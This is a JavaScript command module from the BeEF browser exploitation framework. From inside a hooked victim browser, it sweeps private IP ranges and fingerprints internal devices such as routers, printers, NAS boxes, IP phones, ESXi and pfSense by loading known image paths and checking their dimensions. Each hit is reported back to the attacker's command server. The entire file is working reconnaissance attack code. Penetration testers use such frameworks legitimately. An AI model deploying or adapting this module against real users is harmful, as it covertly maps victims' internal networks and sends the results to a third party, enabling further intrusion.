//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    var dom = document.createElement('b');
    var ips = new Array();
    ipRange = "<%= @ipRange %>";
    ports   = "<%= @ports %>";
    if(ports != null){
      ports = ports.split(',');
    }

    if(ipRange != null){
        // ipRange will be in the form of 192.168.0.1-192.168.0.254: the fourth octet will be iterated.
        // (only C class IPs are supported atm)
        ipBounds   = ipRange.split('-');
        lowerBound = ipBounds[0].split('.')[3];
        upperBound = ipBounds[1].split('.')[3];

        for(i=lowerBound;i<=upperBound;i++){
            ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i;
            ips.push(ipToTest);
        }
    }else{
        //use default IPs
        ips = [
            '192.168.0.1',
            '192.168.0.100',
            '192.168.0.254',
            '192.168.1.1',
            '192.168.1.100',
            '192.168.1.254',
            '10.0.0.1',
            '10.1.1.1',
            '192.168.2.1',
            '192.168.2.254',
            '192.168.100.1',
            '192.168.100.254',
            '192.168.123.1',
            '192.168.123.254',
            '192.168.10.1',
            '192.168.10.254'
        ];
    }

    /* URLs in the form of:
	"Dev/App Name", -- string
	"Default Port", -- string
	"Protocol",     -- string -- http/https
	"Use Multiple Ports if specified", -- boolean
	"IMG path",     -- string -- file path
	"IMG width",    -- integer
	"IMG height"    -- integer
    */
    var urls = new Array(
	new Array(
		"Apache",
		"80","http",false,
		"/icons/apache_pb.gif",259,32),
	new Array(
		"Apache 2.x",
		"80","http",false,
		"/icons/apache_pb2.gif",259,32),
	new Array(
		"Microsoft IIS 7.x",
		"80","http",false,
		"/welcome.png",571,411),
	new Array(
		"Microsoft IIS",
		"80","http",false,
		"/pagerror.gif",36,48),
	new Array(
		"QNAP NAS",
		"8080","http",false,
		"/ajax_obj/img/running.gif",16,16),
	new Array(
		"QNAP NAS",
		"8080","http",false,
		"/ajax_obj/images/qnap_logo_w.gif",115,21),
	new Array(
		"Belkin Router",
		"80","http",false,
		"/images/title_2.gif",321,28),
	new Array(
		"Billion Router",
		"80","http",false,
		"/customized/logo.gif",318,69),
	new Array(
		"Billion Router",
		"80","http",false,
		"/customized/logo.gif",224,55),
//	new Array("SMC Networks","80","http",false,"/images/logo.gif",133,59),
	new Array(
		"Linksys NAS",
		"80","http",false,
		"/Admin_top.JPG",750,52),
	new Array(
		"Linksys NAS",
		"80","http",false,
		"/logo.jpg",194,52),
	new Array(
		"Linksys Network Camera",
		"80","http",false,
		"/welcome.jpg",146,250),
	new Array(
		"Linksys Wireless-G Camera",
		"80","http",false,
		"/header.gif",750,97),
	new Array(
		"Cisco IP Phone",
		"80","http",false,
		"/Images/Logo",120,66),
	new Array(
		"Snom Phone",
		"80","http",false,
		"/img/snom_logo.png",168,62),
	new Array(
		"Dell Laser Printer",
		"80","http",false,
		"/ews/images/delllogo.gif",100,100),
	new Array(
		"Brother Printer",
		"80","http",false,
		"/pbio/brother.gif",144,52),
	new Array(
		"HP LaserJet Printer",
		"80","http",false,
		"/hp/device/images/logo.gif",42,27),
	new Array(
		"HP LaserJet Printer",
		"80","http",false,
		"/hp/device/images/hp_invent_logo.gif",160,52),
	new Array(
		"JBoss Application server",
		"8080","http",true,
		"/images/logo.gif",226,105),
//	new Array("Siemens Simatic","80",false,"/Images/Siemens_Firmenmarke.gif",115,76),
	new Array(
		"APC InfraStruXure Manager",
		"80","http",false,
		"/images/Xlogo_Layer-1.gif",342,327),
	new Array(
		"Barracuda Spam/Virus Firewall",
		"8000","http",true,
		"/images/powered_by.gif",211,26),
	new Array(
		"TwonkyMedia Server",
		"9000","http",false,
		"/images/TwonkyMediaServer_logo.jpg",150,82),
//	new Array("Alt-N MDaemon World Client","3000","http",false,"/LookOut/biglogo.gif",342,98),
//	new Array("VLC Media Player","8080","http",false,"/images/white_cross_small.png",9,9),
	new Array(
		"VMware ESXi Server",
		"80","http",false,
		"/background.jpeg",1,1100),
	new Array(
		"Microsoft Remote Web Workplace",
		"80","http",false,
		"/Remote/images/submit.gif",31,31),
	new Array(
		"XAMPP",
		"80","http",false,
		"/xampp/img/xampp-logo-new.gif",200,59),
	new Array(
		"Xerox Printer",
		"80","http",false,
		"/printbut.gif",30,30),
	new Array(
		"Konica Minolta Printer",
		"80","http",false,
		"/G27_light.gif",206,26),
	new Array(
		"Epson Printer",
		"80","http",false,
		"/cyandot.gif",1,1),
	new Array(
		"HP Printer",
		"80","http",false,
		"/hp/device/images/hp_invent_logo.gif",160,52),
//	new Array("Syncrify","5800","http",false,"/images/468x60.gif",468,60),
//	new Array("Winamp Web Interface","80","http",false,"/img?image=121",30,30),
	new Array(
		"Zenoss",
		"8080","http",false,
		"/zport/dmd/favicon.ico",16,16),
	new Array(
		"BeEF",
		"3000","http",false,
		"/ui/media/images/beef.png",200,149),
	new Array(
		"BeEF (PHP)",
		"80","http",false,
		"/beef/images/beef.gif",32,32),
	new Array(
		"Wordpress",
		"80","http",true,
		"/wp-includes/images/wpmini-blue.png",16,16),
	new Array(
		"Glassfish Server",
		"4848","http",false,
		"/theme/com/sun/webui/jsf/suntheme/images/login/gradlogsides.jpg", 1, 200),
	new Array(
		"pfSense",
		"443","https",false,
		"/themes/pfsense_ng/images/logo.gif",200,56),
	new Array(
		"m0n0wall",
		"80","http",false,
		"/logo.gif",150,47)
	);

	// for each ip
	for(var i=0; i < ips.length; i++) {
		// for each url
		for(var u=0; u < urls.length; u++) {
			if(!urls[u][3] && ports != null){ // use default port
				var img = new Image;
				beef.debug("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "]");
				img.id  = u;
				img.src = urls[u][2]+"://"+ips[i]+":"+urls[u][1]+urls[u][4];
				img.onload = function() { if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'discovered='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
				dom.appendChild(img);
			} else { // iterate to all the specified ports
				for(p=0;p<ports.length;p++){
					var img = new Image;
					beef.debug("Detecting  [" + urls[u][0] + "] at IP [" + ips[i] + "], port [" + ports[p] + "]");
					img.id  = u;
					img.src = urls[u][2]+"://"+ips[i]+":"+ports[p]+urls[u][4];
					img.onload = function() { if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) { beef.net.send('<%= @command_url %>', <%= @command_id %>,'discovered='+escape(urls[this.id][0])+"&url="+escape(this.src));dom.removeChild(this); } }
					dom.appendChild(img);
				}
			}
		}
	}
});

